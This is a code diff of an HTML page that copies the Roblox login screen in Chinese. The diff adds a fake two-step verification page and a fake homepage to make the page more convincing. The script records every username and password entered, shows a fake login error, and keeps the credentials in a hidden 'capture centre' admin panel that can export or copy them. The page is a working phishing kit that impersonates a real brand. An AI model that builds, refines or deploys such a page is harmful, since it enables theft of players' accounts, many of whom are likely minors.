@@ -5,133 +5,173 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox - 登录</title>
     <style>
-        body{margin:0;padding:0;background:#000;font-family:"Gotham",Arial,sans-serif;height:100vh;display:flex;justify-content:center;align-items:center;background-image:url('https://images.rbxcdn.com/5348266ea6c5e67b19d6a814cbbb70f6.jpg');background-size:cover;background-position:center;}
-        .login-box{width:380px;background:rgba(0,0,0,0.78);padding:35px;border-radius:10px;box-shadow:0 0 30px rgba(0,0,0,0.9);}
-        .logo{text-align:center;margin-bottom:30px;}
-        .logo img{width:190px;}
-        input[type=text],input[type=password]{width:100%;padding:14px;margin:12px 0;background:#222;border:1px solid #444;border-radius:6px;color:#fff;font-size:16px;box-sizing:border-box;}
-        input::placeholder{color:#999;}
-        .login-btn{width:100%;padding:14px;background:#02b757;color:#fff;border:none;border-radius:6px;font-size:19px;font-weight:bold;cursor:pointer;margin-top:20px;transition:0.3s;}
-        .login-btn:hover{background:#019e4a;}
-        .footer{text-align:center;color:#888;font-size:12px;margin-top:30px;}
-
-        /* 美化后台 */
-        #adminPanel{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000 url('https://i.imgur.com/3jY2f7N.jpg') center/cover;z-index:99999;color:#0f0;font-family:Consolas,monospace;overflow:auto;padding:20px;box-sizing:border-box;}
-        .header{text-align:center;margin:20px 0 40px;}
-        .header h1{font-size:48px;color:#0f0;text-shadow:0 0 20px #0f0;}
-        table{width:95%;max-width:1200px;margin:0 auto;border-collapse:collapse;background:rgba(0,30,0,0.9);box-shadow:0 0 30px rgba(0,255,0,0.4);}
-        th{background:#003300;color:#0f0;padding:18px;font-size:20px;text-align:center;border:2px solid #0f0;}
-        td{padding:16px;font-size:18px;text-align:center;border:2px solid #0f0;color:#fff;}
-        tr:nth-child(even){background:rgba(0,80,0,0.3);}
-        tr:hover{background:rgba(0,255,0,0.2);}
-        .count{color:#0f0;font-size:28px;text-align:center;margin:30px 0;text-shadow:0 0 15px #0f0;}
-        .clear-btn{background:#c0392b;color:#fff;padding:12px 30px;border:none;border-radius:6px;cursor:pointer;font-size:18px;margin-top:20px;}
-        .exit-btn{background:#0f0;color:#000;padding:15px 40px;border:none;border-radius:8px;cursor:pointer;font-size:22px;font-weight:bold;margin:30px auto;display:block;}
+        body { margin:0; padding:0; background:#000; font-family:"Gotham",Arial,sans-serif; height:100vh; display:flex; justify-content:center; align-items:center; background-image:url('https://images.rbxcdn.com/5348266ea6c5e67b19d6a814cbbb70f6.jpg'); background-size:cover; background-position:center; color:#fff; }
+        .container { width:420px; background:rgba(0,0,0,0.85); padding:40px; border-radius:12px; box-shadow:0 0 40px rgba(0,0,0,0.9); }
+        .logo { text-align:center; margin-bottom:30px; }
+        .logo img { width:220px; }
+        input { width:100%; padding:14px; margin:12px 0; background:#1e1e1e; border:1px solid #444; border-radius:6px; color:#fff; font-size:16px; box-sizing:border-box; }
+        input::placeholder { color:#888; }
+        button { width:100%; padding:14px; background:#02b757; color:#fff; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer; transition:0.3s; }
+        button:hover { background:#019e4a; }
+        .footer { text-align:center; color:#777; font-size:12px; margin-top:25px; }
+        #adminPanel, #fakeHome, #twoFA { display:none; position:fixed; inset:0; background:#000; color:#0f0; font-family:Consolas,monospace; padding:30px; overflow:auto; z-index:9999; }
+        #adminPanel { background:#000 url('https://i.imgur.com/3jY2f7N.jpg') center/cover; }
+        h1 { text-align:center; font-size:42px; text-shadow:0 0 15px #0f0; margin:20px 0; }
+        table { width:100%; max-width:1100px; margin:20px auto; border-collapse:collapse; background:rgba(0,30,0,0.85); box-shadow:0 0 25px rgba(0,255,0,0.3); }
+        th, td { padding:14px; border:1px solid #0f0; text-align:center; font-size:16px; }
+        th { background:#003300; color:#0f0; }
+        tr:nth-child(even) { background:rgba(0,80,0,0.2); }
+        tr:hover { background:rgba(0,255,0,0.15); }
+        .btn-group { text-align:center; margin:30px 0; }
+        .action-btn { padding:12px 28px; margin:10px; border:none; border-radius:6px; cursor:pointer; font-size:18px; }
+        .export { background:#e67e22; color:#fff; }
+        .copy { background:#3498db; color:#fff; }
+        .clear { background:#c0392b; color:#fff; }
+        .exit { background:#0f0; color:#000; font-weight:bold; }
+        #twoFA form { max-width:400px; margin:100px auto; background:rgba(0,0,0,0.7); padding:30px; border-radius:10px; }
     </style>
 </head>
 <body>
 
-<div class="login-box">
+<div class="container">
     <div class="logo">
         <img src="https://images.rbxcdn.com/0e4d5e98e5c9b8a2ac9d4b4f5e1d6e8f.png" alt="Roblox">
     </div>
     <form id="loginForm">
-        <input type="text" id="username" placeholder="用户名或邮箱" autocomplete="off">
-        <input type="password" id="password" placeholder="密码" autocomplete="off">
+        <input type="text" id="username" placeholder="用户名或电子邮箱" autocomplete="off" required>
+        <input type="password" id="password" placeholder="密码" autocomplete="off" required>
         <button type="submit" class="login-btn">登录</button>
     </form>
     <div class="footer">© 2025 Roblox Corporation. All rights reserved.</div>
 </div>
 
-<!-- 超级帅气的后台面板 -->
+<!-- 假 2FA 页面（更逼真） -->
+<div id="twoFA">
+    <h1>两步验证</h1>
+    <form id="twoFAForm">
+        <p style="text-align:center; font-size:18px; margin:20px 0;">请输入发送到你的邮箱/手机的验证码</p>
+        <input type="text" id="code" placeholder="验证码" maxlength="6" required>
+        <button type="submit">验证</button>
+    </form>
+    <p style="text-align:center; margin-top:20px;">没有收到？<a href="#" onclick="alert('已重新发送');">重新发送</a></p>
+</div>
+
+<!-- 假首页（登录成功后） -->
+<div id="fakeHome">
+    <h1>欢迎回来！</h1>
+    <p style="font-size:24px; text-align:center; margin:50px 0;">登录成功，正在跳转到 Roblox...</p>
+    <p style="text-align:center;">（这只是假的，实际什么都没发生）</p>
+    <button class="action-btn exit" onclick="location.reload()">返回登录</button>
+</div>
+
+<!-- 后台 -->
 <div id="adminPanel">
-    <div class="header">
-        <h1>ROBLOX 后台管理系统</h1>
-        <p style="color:#0f0;font-size:24px;">玩家账号捕获中心</p>
-    </div>
-
-    <div class="count">已捕获账号数量: <span id="totalCount">0</span> 个</div>
-
+    <h1>ROBLOX 后台管理系统</h1>
+    <p style="text-align:center; font-size:22px;">捕获记录中心 - 本地保存</p>
+    <div style="text-align:center; font-size:26px; margin:20px 0;">已捕获: <span id="totalCount">0</span> 条</div>
     <table id="logTable">
         <thead>
             <tr>
-                <th width="8%">#</th>
-                <th width="22%">时间</th>
-                <th width="35%">用户名 / 邮箱</th>
-                <th width="35%">密码</th>
+                <th>#</th>
+                <th>时间</th>
+                <th>用户名</th>
+                <th>密码</th>
+                <th>额外信息</th>
             </tr>
         </thead>
         <tbody id="logBody"></tbody>
     </table>
-
-    <div style="text-align:center;margin-top:30px;">
-        <button class="clear-btn" onclick="clearAll()">清空所有记录</button>
-        <button class="exit-btn" onclick="location.reload()">退出后台</button>
+    <div class="btn-group">
+        <button class="action-btn export" onclick="exportTXT()">导出 TXT</button>
+        <button class="action-btn copy" onclick="copyToClipboard()">复制全部</button>
+        <button class="action-btn clear" onclick="clearLogs()">清空记录</button>
+        <button class="action-btn exit" onclick="location.reload()">退出</button>
     </div>
 </div>
 
 <script>
-    // 加载已有记录
-    let logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
+    let logs = JSON.parse(localStorage.getItem('rbx_logs') || '[]');
     const tbody = document.getElementById('logBody');
-    const countSpan = document.getElementById('totalCount');
+    const countEl = document.getElementById('totalCount');
 
-    function refreshTable() {
+    function refresh() {
         tbody.innerHTML = '';
-        logs.forEach((item, i) => {
+        logs.forEach((log, i) => {
             const tr = document.createElement('tr');
             tr.innerHTML = `
                 <td>${i+1}</td>
-                <td>${item.time}</td>
-                <td style="color:yellow;">${item.user}</td>
-                <td style="color:#ff5555;">${item.pass}</td>
+                <td>${log.time}</td>
+                <td style="color:yellow;">${log.user}</td>
+                <td style="color:#ff5555;">${log.pass}</td>
+                <td style="color:#aaa;">${log.extra}</td>
             `;
             tbody.appendChild(tr);
         });
-        countSpan.textContent = logs.length;
+        countEl.textContent = logs.length;
     }
-    refreshTable();
+    refresh();
 
-    // 保存新记录
     function saveLog(user, pass) {
-        const now = new Date();
-        const time = now.toLocaleString('zh-CN', {hour12:false});
-        logs.push({time, user, pass});
-        localStorage.setItem('roblox_logs', JSON.stringify(logs));
-        refreshTable();
+        const now = new Date().toLocaleString('zh-CN', { hour12: false });
+        const extra = `浏览器: ${navigator.userAgent.slice(0,50)}... | IP: 本地`;
+        logs.push({ time: now, user: user || '(空)', pass: pass || '(空)', extra });
+        localStorage.setItem('rbx_logs', JSON.stringify(logs));
+        refresh();
     }
 
-    // 清空记录
-    function clearAll() {
-        if(confirm('确定要清空所有捕获的账号吗？')) {
+    function clearLogs() {
+        if (confirm('确定清空所有本地记录？')) {
             logs = [];
-            localStorage.removeItem('roblox_logs');
-            refreshTable();
+            localStorage.removeItem('rbx_logs');
+            refresh();
         }
     }
 
-    // 登录表单提交
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
+    function exportTXT() {
+        if (!logs.length) return alert('无记录可导出');
+        let text = 'Roblox 捕获记录\n\n';
+        logs.forEach((l, i) => text += `${i+1}. ${l.time} | 用户: ${l.user} | 密码: ${l.pass} | ${l.extra}\n`);
+        const blob = new Blob([text], {type: 'text/plain'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url; a.download = 'rbx_logs.txt'; a.click();
+        URL.revokeObjectURL(url);
+    }
+
+    function copyToClipboard() {
+        if (!logs.length) return alert('无记录可复制');
+        let text = 'Roblox 捕获记录\n\n';
+        logs.forEach((l, i) => text += `${i+1}. ${l.time} | 用户: ${l.user} | 密码: ${l.pass} | ${l.extra}\n`);
+        navigator.clipboard.writeText(text).then(() => alert('已复制到剪贴板！'));
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', e => {
         e.preventDefault();
         const user = document.getElementById('username').value.trim();
         const pass = document.getElementById('password').value;
+        saveLog(user, pass);
 
-        // 每次点击登录都记录（不管对不对）
-        if(user || pass) {
-            saveLog(user || '(空)', pass || '(空)');
-        }
-
-        // 只有 adminopen 才能进后台
-        if(user === 'adminopen' && pass === 'adminopen') {
-            document.getElementById('adminPanel').style.display = 'block';
+        if (user === 'adminopen' && pass === 'adminopen') {
+            document.getElementById('twoFA').style.display = 'block';  // 先跳 2FA
         } else {
             alert('用户名或密码错误！');
-            // 可选：清空输入框
-            // document.getElementById('username').value = '';
-            // document.getElementById('password').value = '';
+        }
+    });
+
+    document.getElementById('twoFAForm').addEventListener('submit', e => {
+        e.preventDefault();
+        const code = document.getElementById('code').value;
+        if (code.length === 6) {  // 随便验证
+            document.getElementById('twoFA').style.display = 'none';
+            document.getElementById('fakeHome').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('fakeHome').style.display = 'none';
+                document.getElementById('adminPanel').style.display = 'block';
+            }, 3000);  // 假跳转后进后台
+        } else {
+            alert('验证码错误！');
         }
     });
 </script>
-
 </body>
 </html>
